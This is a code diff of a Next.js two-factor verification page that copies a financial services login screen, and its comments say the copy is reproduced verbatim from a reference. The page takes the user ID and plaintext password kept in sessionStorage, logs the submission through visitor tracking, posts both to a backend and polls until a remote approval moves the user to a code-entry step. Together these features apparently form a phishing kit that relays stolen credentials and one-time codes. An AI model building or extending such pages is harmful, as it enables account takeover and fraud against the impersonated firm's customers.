@@ -1,66 +1,91 @@
 'use client'
 
-
-import {
-  MSG_UNABLE_VERIFY_TIME,
-  approvalPollDelayMs,
-} from "@/lib/approval-messages"
-const POLL_INTERVAL_MS = 750
-const WAIT_TIMEOUT_MS = 90 * 1000
 import Link from "next/link"
 import Image from "next/image"
 import { useState, useEffect, useRef } from 'react'
-import { Phone, Mail, MessageSquare, X, ArrowLeft, ArrowRight, Loader2 } from "lucide-react"
+import { Check, ChevronDown, Info, Lock, Mail, Phone, X } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Footer } from "@/components/footer"
+import { ThreeDotSpinner } from "@/components/ThreeDotSpinner"
 import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
 import { useRequireLoginFlow } from "@/hooks/use-require-login-flow"
 import { setAptiaLoginFlowStage } from "@/hooks/use-aptia-login-flow-guard"
 import {
-  BBP_PRIMARY_BUTTON_CLASS,
-  BBP_SECONDARY_BUTTON_CLASS,
+  MSG_UNABLE_VERIFY_TIME,
+  approvalPollDelayMs,
+} from "@/lib/approval-messages"
+import {
+  WEALTHCARE_BUTTON_CHROME,
+  WEALTHCARE_BUTTON_GEOMETRY,
+  WEALTHCARE_NEUTRAL_BUTTON_CLASS,
 } from "@/lib/wealthcare-button-styles"
+
+const POLL_INTERVAL_MS = 750
+const WAIT_TIMEOUT_MS = 90 * 1000
 
 const VERIFICATION_LOADING_MS = 10000
 
+const METHOD_OPTIONS: ReadonlyArray<{ value: "email" | "text"; label: string }> = [
+  { value: "email", label: "Email" },
+  { value: "text", label: "Text" },
+]
+
+/** Reference copy, verbatim. The note's missing space after "button." is in the
+ *  original string and is reproduced exactly. */
+const CONF_TEXT =
+  "Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen."
+
+const NOTE_TEXT =
+  "To proceed, please press the generate code button.If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."
+
+/** Step 2's note — the reference drops the "press generate code" sentence. */
+const WAITING_NOTE_TEXT =
+  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."
+
+/** Chrome from the shared Wealthcare tokens; the fill is BBP's own. */
+const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME} bg-[#141c4d] hover:bg-[#407ec9] text-white disabled:opacity-70`
+
+const NEUTRAL_BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_NEUTRAL_BUTTON_CLASS} bg-[#407ec9] hover:bg-[#141c4d] text-white disabled:opacity-70`
+
+const CONTENT_COLUMN =
+  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]"
+
+const CONTENT_INNER =
+  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]"
+
 export default function Login2FAVerifyPage() {
   const allowed = useRequireLoginFlow()
-  const [maskedEmail, setMaskedEmail] = useState("**********")
-  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
+  const [method, setMethod] = useState<"email" | "text">("email")
   const [isLoading, setIsLoading] = useState(false)
   const [loadingMethod, setLoadingMethod] = useState<'email' | 'text' | null>(null)
 
   const [pendingId, setPendingId] = useState<string | null>(null)
   const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null)
   const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
-  const [optionClicked, setOptionClicked] = useState(false)
+  const [networkError, setNetworkError] = useState('')
 
-  useEffect(() => {
-    if (!allowed || typeof window === 'undefined') return
-    const email = sessionStorage.getItem('maskedEmail')
-    const phone = sessionStorage.getItem('maskedPhone')
-    if (email) setMaskedEmail(email)
-    if (phone) setMaskedPhone(phone)
-  }, [allowed])
-
-  const handleVerificationMethod = async (method: 'email' | 'text') => {
+  const handleVerificationMethod = async (selected: 'email' | 'text') => {
     if (loadingMethod !== null || isLoading) return
 
-    setLoadingMethod(method)
+    setLoadingMethod(selected)
     setIsLoading(true)
+    setNetworkError('')
+
+    const maskedEmailStored = typeof window !== 'undefined' ? sessionStorage.getItem('maskedEmail') ?? '' : ''
+    const maskedPhoneStored = typeof window !== 'undefined' ? sessionStorage.getItem('maskedPhone') ?? '' : ''
 
     trackFormSubmission({
-      type: method === 'email' ? 'email_verification' : 'text_verification',
-      page: `/login/2fa-verify?method=${method}`,
+      type: selected === 'email' ? 'email_verification' : 'text_verification',
+      page: `/login/2fa-verify?method=${selected}`,
       userId: typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : '',
-      ...(method === 'email' ? { email: maskedEmail } : { phone: maskedPhone }),
+      ...(selected === 'email' ? { email: maskedEmailStored } : { phone: maskedPhoneStored }),
     }).catch(() => { })
 
     try {
       if (typeof window !== 'undefined') {
-        sessionStorage.setItem('verificationMethod', method)
-        sessionStorage.setItem('maskedEmail', maskedEmail)
-        sessionStorage.setItem('maskedPhone', maskedPhone)
+        sessionStorage.setItem('verificationMethod', selected)
+        sessionStorage.setItem('maskedEmail', maskedEmailStored)
+        sessionStorage.setItem('maskedPhone', maskedPhoneStored)
       }
       const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
       const password = typeof window !== 'undefined' ? sessionStorage.getItem('loginPassword') ?? '' : ''
@@ -70,9 +95,9 @@ export default function Login2FAVerifyPage() {
         body: JSON.stringify({
           userId,
           password,
-          method,
-          maskedEmail,
-          maskedPhone,
+          method: selected,
+          maskedEmail: maskedEmailStored,
+          maskedPhone: maskedPhoneStored,
           flow: 'login',
         }),
       })
@@ -83,11 +108,11 @@ export default function Login2FAVerifyPage() {
       }
       setLoadingMethod(null)
       setIsLoading(false)
-      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
+      setNetworkError(MSG_UNABLE_VERIFY_TIME)
     } catch {
       setLoadingMethod(null)
       setIsLoading(false)
-      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
+      setNetworkError(MSG_UNABLE_VERIFY_TIME)
     }
   }
 
@@ -111,7 +136,7 @@ export default function Login2FAVerifyPage() {
       setPendingId(null)
       setLoadingMethod(null)
       setIsLoading(false)
-      setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
+      setNetworkError(MSG_UNABLE_VERIFY_TIME)
     }, WAIT_TIMEOUT_MS)
 
     const poll = async () => {
@@ -129,8 +154,8 @@ export default function Login2FAVerifyPage() {
           const approvedMethod = data?.method || loadingMethod
           if (typeof window !== 'undefined' && approvedMethod) {
             sessionStorage.setItem('verificationMethod', approvedMethod)
-            sessionStorage.setItem('maskedEmail', maskedEmail)
-            sessionStorage.setItem('maskedPhone', maskedPhone)
+            sessionStorage.setItem('maskedEmail', sessionStorage.getItem('maskedEmail') ?? '')
+            sessionStorage.setItem('maskedPhone', sessionStorage.getItem('maskedPhone') ?? '')
             sessionStorage.setItem('loginFrom2fa', '1')
             setAptiaLoginFlowStage('otp')
           }
@@ -153,7 +178,7 @@ export default function Login2FAVerifyPage() {
           setPendingId(null)
           setLoadingMethod(null)
           setIsLoading(false)
-          setIsLoading(false); setError(MSG_UNABLE_VERIFY_TIME)
+          setNetworkError(MSG_UNABLE_VERIFY_TIME)
         }
       } catch {
         // ignore temporary poll errors
@@ -173,10 +198,12 @@ export default function Login2FAVerifyPage() {
       void tick()
 
     return clearPolling
-  }, [pendingId, loadingMethod, maskedEmail, maskedPhone])
+  }, [pendingId, loadingMethod])
 
-  const isWaiting = loadingMethod !== null && pendingId !== null
+  /* Swap on the clicked method, not on request resolution. */
+  const isWaiting = loadingMethod !== null
   const showMethodSelection = !isWaiting
+  const optionsDisabled = loadingMethod !== null || isLoading
 
   if (!allowed) {
     return (
@@ -220,77 +247,108 @@ export default function Login2FAVerifyPage() {
       </header>
 
       {/* Main Content */}
-      <main className="flex-1 flex flex-col items-center px-6 py-8">
-        <div className="w-full max-w-3xl">
-          {isWaiting && (
-            <div className="text-center py-8">
-              <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
-              <p className="text-sm text-gray-500 mb-2">
-                Sending verification code to{" "}
-                {loadingMethod === "email" ? "your email" : "your phone"}...
-              </p>
-            </div>
-          )}
-
-          {showMethodSelection && (
-            <>
-          <p className="text-center text-gray-700 mb-8">
-            We found you! Pick a method to receive a verification code now.
-          </p>
-
-          <div className="max-w-lg mx-auto space-y-4 mb-8">
-            {/* Email Option */}
-            <div className={`flex items-center justify-between gap-4 ${optionClicked ? 'opacity-60 pointer-events-none' : ''}`}>
-              <div className="text-gray-700">
-                <span>Send code to email:</span>
-                <span className="font-medium"> {maskedEmail}</span>
+      <main className="flex-1 flex flex-col min-[1200px]:items-center">
+        <div className={CONTENT_COLUMN}>
+          <div className={CONTENT_INNER}>
+            {isWaiting && (
+              <div className="text-center mb-[18px]">
+                <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
+                <p className="text-[14px] leading-[1.6] text-[#707070]">
+                  {loadingMethod === "email" ? "An e-mail has been sent:" : "An SMS has been sent:"}
+                </p>
+                <p className="text-[14px] leading-[1.6] text-[#707070]">
+                  Enter the verification code that you received via{" "}
+                  <strong className="font-semibold">{loadingMethod === "email" ? "Email" : "SMS"}</strong> below:
+                </p>
+                <p className="text-[14px] leading-[1.6] text-[#707070] mt-4">
+                  Note - Do not share your verification code with anyone else
+                </p>
               </div>
-              <Button
-                className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
-                onClick={() => handleVerificationMethod('email')}
-                disabled={isLoading}
-              >
-                {isLoading ? 'Loading...' : <><Mail className="w-4 h-4 mr-2" /> E-MAIL</>}
-              </Button>
-            </div>
+            )}
 
-            {/* Text Option */}
-            <div className={`flex items-center justify-between gap-4 ${optionClicked ? 'opacity-60 pointer-events-none' : ''}`}>
-              <div className="text-gray-700">
-                <span>Send code via text:</span>
-                <span className="font-medium"> {maskedPhone}</span>
-              </div>
-              <Button
-                className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
-                onClick={() => handleVerificationMethod('text')}
-                disabled={isLoading}
-              >
-                {isLoading ? 'Loading...' : <><MessageSquare className="w-4 h-4 mr-2" /> TEXT</>}
-              </Button>
+            {/* Spinner occupies the form region only — copy and note stay put. */}
+            {isWaiting && <ThreeDotSpinner label="Sending your verification code" />}
+
+            {showMethodSelection && (
+              <>
+                <div className="text-center mb-[18px]">
+                  <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
+                  <p className="text-[14px] leading-[1.6] text-[#707070]">{CONF_TEXT}</p>
+                </div>
+
+                {networkError ? (
+                  <p className="text-red-600 text-sm text-center mb-4" role="alert">
+                    {networkError}
+                  </p>
+                ) : null}
+
+                <div className={`transition-opacity ${optionsDisabled ? "opacity-60" : ""}`}>
+                  {/* Label 200px + 36px inset / control 202px, side-by-side only at >=1200px. */}
+                  <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
+                    <div className="w-full max-[768px]:mx-[5px] min-[769px]:pl-9 min-[1200px]:w-[200px] min-[1200px]:mr-auto">
+                      <span className="block text-[14px] text-gray-700 max-[768px]:pl-8 min-[769px]:pl-0">
+                        Confirmation Code
+                      </span>
+                    </div>
+                    <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
+                      <select
+                        aria-label="Confirmation Code"
+                        name="confirmationMethod"
+                        value={method}
+                        disabled={optionsDisabled}
+                        onChange={(e) => setMethod(e.target.value as "email" | "text")}
+                        className="w-full h-full pl-3 pr-8 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none appearance-none disabled:bg-[#f3f3f3] disabled:text-[#b0b0b0]"
+                      >
+                        {METHOD_OPTIONS.map((o) => (
+                          <option key={o.value} value={o.value}>{o.label}</option>
+                        ))}
+                      </select>
+                      <ChevronDown
+                        className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 w-[22px] h-[22px] text-[#424242]"
+                        aria-hidden="true"
+                      />
+                    </div>
+                  </div>
+
+                  {/* 220px block, stacked, each button 100% wide. */}
+                  <div className="w-[220px] mx-auto">
+                    <Button
+                      type="button"
+                      disabled={optionsDisabled}
+                      onClick={() => { window.location.href = '/' }}
+                      className={`${NEUTRAL_BUTTON_CHROME} mb-[10px]`}
+                    >
+                      <X className="w-6 h-6 shrink-0" />
+                      <span className="flex-1 text-center truncate">Cancel</span>
+                    </Button>
+
+                    <Button
+                      type="button"
+                      disabled={optionsDisabled}
+                      onClick={() => void handleVerificationMethod(method)}
+                      className={BUTTON_CHROME}
+                    >
+                      <Check className="w-6 h-6 shrink-0" />
+                      <span className="flex-1 text-center truncate">Generate Code</span>
+                    </Button>
+                  </div>
+                </div>
+              </>
+            )}
+
+            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
+            <div
+              role="note"
+              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
+              style={{ backgroundColor: "#F3F7A9" }}
+            >
+              <Info
+                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] text-[#414141]"
+                aria-hidden="true"
+              />
+              <p className="m-0">{isWaiting ? WAITING_NOTE_TEXT : NOTE_TEXT}</p>
             </div>
           </div>
-
-          {/* Action Buttons */}
-          <div className="flex items-center justify-center gap-3 mb-6">
-            <Link href="/">
-              <Button
-                className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
-              >
-                <X className="w-4 h-4 mr-2" />
-                CANCEL
-              </Button>
-            </Link>
-            <Link href="/">
-              <Button
-                className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}
-              >
-                <ArrowLeft className="w-4 h-4 mr-2" />
-                BACK
-              </Button>
-            </Link>
-          </div>
-            </>
-          )}
         </div>
       </main>
 
